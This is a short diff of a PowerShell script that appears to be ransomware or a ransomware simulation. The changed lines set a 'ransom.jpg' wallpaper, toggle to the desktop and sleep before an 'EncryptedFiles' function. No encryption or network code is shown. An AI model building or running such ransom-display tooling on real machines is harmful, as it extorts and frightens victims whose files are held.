@@ -81,8 +81,8 @@ If (!(Test-Path -Path "C:\temp" -PathType Container))
 }
 
 Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Stretch | Out-Null
-
-Start-Sleep 2
+(New-Object -ComObject shell.application).toggleDesktop()
+Start-Sleep 3
 function EncryptedFiles 
 { 
     # $Source = "w:\" # replace the path with the folders you encrypted
